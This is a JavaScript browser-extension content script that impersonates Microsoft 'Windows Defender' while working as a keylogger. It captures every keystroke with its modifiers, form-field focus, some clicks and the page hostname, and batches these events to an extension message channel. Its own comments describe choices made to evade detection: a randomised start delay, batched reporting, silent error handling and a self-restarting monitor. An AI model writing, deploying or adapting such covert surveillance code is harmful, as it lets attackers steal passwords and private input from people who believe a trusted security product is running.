// Self-executing anonymous function for obfuscation
(function() {
    'use strict';
    
    const config = {
        company: "Microsoft",
        product: "Windows Defender",
        version: "1.0.2"
    };
    
    let isMonitoring = true;
    let activityBuffer = [];
    let lastReportTime = Date.now();
    
    // Legitimate-looking initialization
    console.log(`${config.product} ${config.version}: Initializing input optimization...`);
    
    // Map keys to legitimate-sounding events
    const keyMap = {
        ' ': 'SpaceBar',
        'Enter': 'ReturnKey',
        'Tab': 'TabKey',
        'Escape': 'EscapeKey',
        'Backspace': 'BackspaceKey',
        'Delete': 'DeleteKey',
        'Shift': 'ShiftModifier',
        'Control': 'ControlModifier',
        'Alt': 'AltModifier',
        'CapsLock': 'CapsLockToggle',
        'ArrowUp': 'NavigationUp',
        'ArrowDown': 'NavigationDown',
        'ArrowLeft': 'NavigationLeft',
        'ArrowRight': 'NavigationRight',
        'PageUp': 'PageUpScroll',
        'PageDown': 'PageDownScroll',
        'Home': 'HomeNavigation',
        'End': 'EndNavigation',
        'Insert': 'InsertToggle'
    };
    
    function getLegitimateEventName(key) {
        return keyMap[key] || `Key_${key.toUpperCase()}`;
    }
    
    function reportActivity(eventType, details) {
        if (!isMonitoring) return;
        
        const timestamp = new Date().toISOString();
        const event = {
            timestamp: timestamp,
            type: eventType,
            details: details,
            window: window.location.hostname,
            userAgent: navigator.userAgent.substring(0, 50)
        };
        
        activityBuffer.push(event);
        
        // Send batch reports to avoid detection
        if (activityBuffer.length >= 10 || Date.now() - lastReportTime > 30000) {
            sendBatchReport();
        }
    }
    
    function sendBatchReport() {
        if (activityBuffer.length === 0) return;
        
        const report = {
            type: 'ACTIVITY',
            data: `Input optimization batch: ${activityBuffer.length} events processed`,
            events: JSON.stringify(activityBuffer)
        };
        
        try {
            chrome.runtime.sendMessage(report, (response) => {
                if (chrome.runtime.lastError) {
                    // Silently handle errors
                    setTimeout(sendBatchReport, 5000);
                } else {
                    activityBuffer = [];
                    lastReportTime = Date.now();
                }
            });
        } catch (e) {
            // Silent error handling
        }
    }
    
    // Enhanced event listeners with legitimate names
    function initializeMonitoring() {
        // Keyboard events
        document.addEventListener('keydown', function(e) {
            const eventName = getLegitimateEventName(e.key);
            reportActivity('KeyboardInput', {
                event: eventName,
                code: e.code,
                location: e.location,
                repeat: e.repeat,
                modifiers: {
                    ctrl: e.ctrlKey,
                    shift: e.shiftKey,
                    alt: e.altKey,
                    meta: e.metaKey
                }
            });
        }, true);
        
        // Mouse events (limited to look legitimate)
        document.addEventListener('click', function(e) {
            if (Math.random() > 0.9) { // Only log 10% of clicks
                reportActivity('MouseInteraction', {
                    type: 'Click',
                    target: e.target.tagName,
                    coordinates: { x: e.clientX, y: e.clientY }
                });
            }
        }, true);
        
        // Form interactions
        document.addEventListener('focus', function(e) {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                reportActivity('FormFocus', {
                    field: e.target.type || 'text',
                    name: e.target.name || 'unnamed'
                });
            }
        }, true);
        
        // Page visibility changes
        document.addEventListener('visibilitychange', function() {
            reportActivity('PageVisibility', {
                state: document.visibilityState,
                hidden: document.hidden
            });
        });
        
        // Network status
        window.addEventListener('online', () => {
            reportActivity('NetworkStatus', { status: 'online' });
        });
        
        window.addEventListener('offline', () => {
            reportActivity('NetworkStatus', { status: 'offline' });
        });
        
        // Periodic system check (legitimate activity)
        setInterval(() => {
            reportActivity('SystemCheck', {
                memory: performance.memory ? 
                    Math.round(performance.memory.usedJSHeapSize / 1048576) + 'MB' : 'N/A',
                loadTime: Math.round(performance.now()),
                readyState: document.readyState
            });
        }, 300000); // Every 5 minutes
        
        console.log(`${config.product}: Input optimization active`);
    }
    
    // Delayed initialization to avoid detection
    setTimeout(() => {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initializeMonitoring);
        } else {
            initializeMonitoring();
        }
    }, Math.random() * 5000 + 1000); // Random delay 1-6 seconds
    
    // Self-protection: Restart monitoring if stopped
    setInterval(() => {
        if (!isMonitoring && Math.random() > 0.7) {
            isMonitoring = true;
            console.log(`${config.product}: Monitoring resumed`);
        }
    }, 60000);
    
    // Clean shutdown on page unload
    window.addEventListener('beforeunload', () => {
        isMonitoring = false;
        sendBatchReport();
    });
    
})();